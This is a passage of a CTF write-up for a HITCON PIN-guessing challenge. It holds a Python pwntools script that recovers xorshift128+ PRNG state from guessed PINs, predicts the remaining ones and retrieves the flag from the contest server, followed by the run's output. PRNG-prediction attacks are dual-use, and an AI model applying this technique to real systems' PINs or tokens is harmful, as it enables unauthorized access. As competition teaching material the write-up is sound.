</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>foundPermutations</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getOne</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>foundPermutations</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span><span class=o>.</span><span class=n>pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>special</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>parseResult</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>foundPermutations</span> <span class=ow>and</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>a</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=k>if</span> <span class=ow>not</span> <span class=nb>any</span><span class=p>([</span><span class=n>i</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>==</span> <span class=n>x</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)])]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=k>if</span> <span class=nb>sum</span><span class=p>([</span><span class=n>i</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>==</span> <span class=n>x</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)])</span> <span class=o>==</span> <span class=n>a</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>&gt;</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>h</span> <span class=o>=</span> <span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>a</span> <span class=o>+</span> <span class=n>b</span><span class=p>)[</span><span class=mi>2</span><span class=p>:])[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>h</span> <span class=o>+=</span> <span class=s1>&#39;0000000000&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>h</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;1&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>p</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=o>=</span> <span class=nb>list</span><span class=p>([</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=n>l</span><span class=p>))</span> <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=n>permutations</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=mi>4</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>shuffle</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>foundPermutations</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>pinFound</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>found</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>possibilities</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>foundPermutations</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>guess_random</span><span class=p>(</span><span class=n>proc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pin</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>tries</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>guesser</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>tries</span> <span class=o>&lt;=</span> <span class=mi>40</span> <span class=ow>and</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>proc</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pin</span> <span class=o>=</span> <span class=n>guesser</span><span class=o>.</span><span class=n>getOne</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>proc</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>pin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>proc</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(res)</span>
</span></span><span class=line><span class=cl>        <span class=n>tries</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;U&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=sa>b</span><span class=s1>&#39;O&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>guesser</span><span class=o>.</span><span class=n>pinFound</span><span class=p>(</span><span class=n>pin</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>pin</span><span class=p>,</span> <span class=s2>&#34;;&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=s2>&#34;after&#34;</span><span class=p>,</span> <span class=n>tries</span><span class=p>,</span> <span class=s2>&#34;tries&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>a</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>[:</span><span class=o>-</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>guesser</span><span class=o>.</span><span class=n>parseResult</span><span class=p>(</span><span class=n>pin</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(&#34;tries:&#34;, tries)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(guesser.found)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>origin</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>guesser</span><span class=o>.</span><span class=n>found</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>derivePins</span><span class=p>(</span><span class=n>points</span><span class=p>,</span> <span class=n>multiple</span> <span class=o>=</span> <span class=mi>5040</span><span class=p>,</span> <span class=n>lead</span> <span class=o>=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span> <span class=o>=</span> <span class=n>solve_random</span><span class=p>(</span><span class=n>points</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=n>multiple</span><span class=p>,</span> <span class=n>lead</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[+] recovered state:&#39;</span><span class=p>,</span> <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>saved_state0</span><span class=p>,</span> <span class=n>saved_state1</span> <span class=o>=</span> <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>partial</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>output</span> <span class=o>=</span> <span class=n>xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>partial</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>multiple</span> <span class=o>*</span> <span class=n>to_double</span><span class=p>(</span><span class=n>state0</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>+=</span> <span class=n>partial</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span> <span class=o>=</span> <span class=n>saved_state0</span><span class=p>,</span> <span class=n>saved_state1</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>multiple</span> <span class=o>*</span> <span class=n>to_double</span><span class=p>(</span><span class=n>state0</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>output</span> <span class=o>=</span> <span class=n>reverse_xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>solutions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>multiple</span> <span class=o>*</span> <span class=n>to_double</span><span class=p>(</span><span class=n>output</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=n>solutions</span><span class=p>[:</span><span class=mi>64</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span> <span class=o>=</span> <span class=n>saved_state0</span><span class=p>,</span> <span class=n>saved_state1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>partial</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>output</span> <span class=o>=</span> <span class=n>xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>65</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>,</span> <span class=n>output</span> <span class=o>=</span> <span class=n>xs128p</span><span class=p>(</span><span class=n>state0</span><span class=p>,</span> <span class=n>state1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>multiple</span> <span class=o>*</span> <span class=n>to_double</span><span class=p>(</span><span class=n>output</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>partial</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>+=</span> <span class=n>partial</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>solutions</span> <span class=o>=</span> <span class=n>solutions</span><span class=p>[:</span><span class=mi>100</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>origin</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=k>for</span> <span class=n>idx</span> <span class=ow>in</span> <span class=n>solutions</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>(</span><span class=n>proc</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>proc</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Show me sha256(&#34;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prefix</span> <span class=o>=</span> <span class=n>proc</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#34;&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>proc</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;ends with &#34;00000&#34;: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>guess</span> <span class=o>=</span> <span class=n>proof_of_work</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>proc</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># start the guessing of pins</span>
</span></span><span class=line><span class=cl>    <span class=n>randoms</span> <span class=o>=</span> <span class=n>guess_random</span><span class=p>(</span><span class=n>proc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># if we don&#39;t have enough pins we retry</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>randoms</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;We have &#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>randoms</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;yeet&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;#################&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;#################&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;#################&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;#################&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># now we recover the states and next pins</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>randoms</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pins</span> <span class=o>=</span> <span class=n>derivePins</span><span class=p>(</span><span class=n>randoms</span><span class=p>)[</span><span class=nb>len</span><span class=p>(</span><span class=n>randoms</span><span class=p>):]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># we input all the pins</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>pins</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>proc</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>proc</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=c1># we get the flag</span>
</span></span><span class=line><span class=cl>    <span class=n>proc</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>x</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s1>&#39;18.183.134.249&#39;</span><span class=p>,</span> <span class=mi>1234</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span> <span class=k>as</span> <span class=n>proc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=n>solve</span><span class=p>(</span><span class=n>proc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><h3 class="relative group">Execution<div id=execution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#execution aria-label=Anchor>#</a></span></h3><p>With a lot of luck</p><pre tabindex=0><code>[+] Opening connection to 18.183.134.249 on port 1234: Done
found 332260 2030edc98d041ec0159f1e75a0cecacca4028f83572e34fb0f35761919a00000
2981 ; 1 after 4 tries
7109 ; 2 after 6 tries
9250 ; 3 after 11 tries
0256 ; 4 after 16 tries
9580 ; 5 after 19 tries
7129 ; 6 after 23 tries
8697 ; 7 after 26 tries
8037 ; 8 after 28 tries
4286 ; 9 after 32 tries
3416 ; 10 after 35 tries
3798 ; 11 after 39 tries
#################
#################
#################
#################
[1506, 3590, 4676, 80, 4865, 3597, 4423, 4051, 2174, 1690, 1903]
[+] recovered state: 5977170398082918709 6965505899860868137
b&#39;Pin 12? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 13? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 14? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 15? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 16? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 17? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 18? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 19? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 20? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 21? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 22? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 23? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 24? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 25? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 26? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 27? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 28? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 29? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 30? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 31? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 32? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 33? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 34? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 35? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 36? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 37? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 38? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 39? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 40? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 41? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 42? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 43? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 44? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 45? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 46? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 47? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 48? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 49? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 50? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 51? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 52? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 53? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 54? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 55? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 56? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 57? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 58? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 59? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 60? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 61? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 62? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 63? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 64? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 65? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 66? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 67? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 68? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 69? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 70? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 71? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 72? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 73? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 74? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 75? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 76? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 77? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 78? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 79? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 80? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 81? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 82? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 83? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 84? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 85? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 86? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 87? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 88? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 89? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 90? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 91? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 92? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 93? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 94? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 95? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 96? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 97? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 98? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 99? \x1b[1;32mOK\x1b[0m\n&#39;
b&#39;Pin 100? \x1b[1;32mOK\x1b[0m\n&#39;
[*] Switching to interactive mode
FLAG Unlocked: hitcon{even_my_c4t_can_s0lve_4_digits_pin_4A999B}
[*] Got EOF while reading in interactive
